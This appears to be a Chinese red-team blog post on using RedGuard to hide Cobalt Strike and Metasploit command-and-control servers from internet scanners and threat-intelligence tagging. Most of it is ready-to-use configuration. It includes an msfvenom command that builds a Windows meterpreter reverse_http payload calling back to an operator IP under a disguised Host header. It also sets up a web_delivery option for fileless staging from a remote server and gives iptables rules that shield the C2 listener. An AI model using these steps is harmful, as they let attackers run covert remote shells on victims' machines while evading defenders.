---
title: c2隐藏-RedGuard
date: 2023-02-02 16:30:32
categories: 渗透测试
tags: 工具分享
---

### 简介

前几天发现自己的服务器被fofa和微步情报标记为了cobaltstrike服务器，由于以前使用的版本没有对相应的特征做修改，导致被空间搜索引擎标记，刚好看到风起在朋友圈发布了RedGuard，于是赶紧试试鲜。

RedGuard由风起大佬编写的一款c2前置流量控制工具，可以帮助红队更好的隐藏c2基础设施，且目前还在更新和完善之中，在写这篇文章之后又进行了2次更新，优化和增加了一些新功能。

<!--more-->

[github地址](https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md)

### 使用

第一次运行会在用户目录生成**.RedGuard_CobaltStrike.ini**文件，编辑此文件对其进行配置，当然也支持参数进行热配置。

![](https://cdn.laohuan.art/Snipaste_2022-05-31_22-17-54.png)

重点关注proxy的3个配置

* Port_HTTPS
* port_HTTP
* HostTarget

如上图，当前配置的意思是将Port_http的80端口绑定到本机127.0.0.1的8080端口，当有请求访问服务器的80端口，RedGuard会对请求特征做判断，当请求不符合规则(及host头不是360.net，这个可以随意设置)，请求会被重定向到https://360.net,否则请求会被转发到cs的监听端口8080端口。请求会不会被重定向取决于DROP参数，如DORP参数设置为true将直接丢弃请求包。

同理,443端口被绑定到本机127.0.0.1的8443端口，当请求不符合规则时将请求重定向到https://360.net,当host头为360.com时将请求转发到cs的8443监听端口，主要取决于你cs的监听器是http还是https。

更多设置，如过滤上线ip、上线时间、上线省份请参考作者官方文档[RedGuard文档](https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md)

当然，这种场景适合将反代和cs服务器建在同一台机器上，比较节省资源，配合iptables可防止网络空间搜索引擎将你的服务器标记。

### CS

启动RedGuard `sudo ./RedGuard_64`

cs新建监听，c2端口设置为RedGaurd的反代端口，bind设置为cs的监听端口，注意host header可以随意设置，但一定要和配置文件里的一致。

![](https://cdn.laohuan.art/Snipaste_2022-05-31_22-42-34.png)

再配置IPtables，只允许127.0.0.1访问本机的8443端口

```bash
iptables -I INPUT -p tcp --dport 8443 -j DROP #丢弃所有访问8443端口的包
iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8443 -j ACCEPT #只允许127.0.0.1访问本机的8443端口
```

这样就可以正常上线了

还有一种就是拿一台单独的服务器做反代服务器，另一台服务器做真正的cs服务器，只需简单修改配置文件即可

![](https://cdn.laohuan.art/Snipaste_2022-05-31_22-51-28.png)

这里将192.168.1.8用作反代服务器，192.168.1.7作为真正的cs服务器，HosTtarget填写cs服务器的地址192.168.1.7

新建cs监听，填写相应端口。

![](https://cdn.laohuan.art/Snipaste_2022-05-31_22-56-17.png)

在cs服务器配置防火墙，只允许反向代理服务器来访问cs的监听端口

```bash
iptables -I INPUT -p tcp --dport 8443 -j DROP 
iptables -I INPUT -p tcp -s 192.168.1.8 --dport 8443 -j ACCEPT 
```

### MSF

生成载荷

`msfvenom -p windows/x64/meterpreter/reverse_http  LHOST=10.197.10.131 LPORT=80  HttpHostHeader=360.net -f exe -o test.exe`

建立监听和设置参数，这里反代端口为80端口，80端口收到请求且符合规则后将其转发到本地的8080端口

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
 
set OverrideLHOST 10.197.10.131 
set overrideLPORT 80
set overriderequesthost true
set httphostheader 360.net 

run

```

配置防火墙

```bash
iptables -I INPUT -p tcp --dport 8080 -j DROP 
iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8080 -j ACCEPT 
```



![](https://cdn.laohuan.art/Snipaste_2022-06-01_17-20-16.png)

在能执行命令的情况下，想方便点使用无文件落地的方式

```bash
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_http
set lhost 192.168.1.8
set lport 80 #端口设置为反向代理端口
set srvport 8082 #用于下载stage
set httphostheader 360.net
set OverrideLhOST 192.168.1.8
set overrideLpoRT 80
set overriderequesthost true
set DisablePayloadHandler true #关闭监听
run

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_http
set lhost 127.0.0.1
set lport 8080
set httphostheader 360.net
set OverrideLhOST 192.168.1.8
set overrideLpoRT 80
set overriderequesthost true
run

```

同样配置防火墙

```bash
iptables -I INPUT -p tcp --dport 8080 -j DROP 
iptables -I INPUT -p tcp -s 127.0.0.1 --dport 8080 -j ACCEPT 
```



![](https://cdn.laohuan.art/Snipaste_2022-06-05_15-47-01.png)

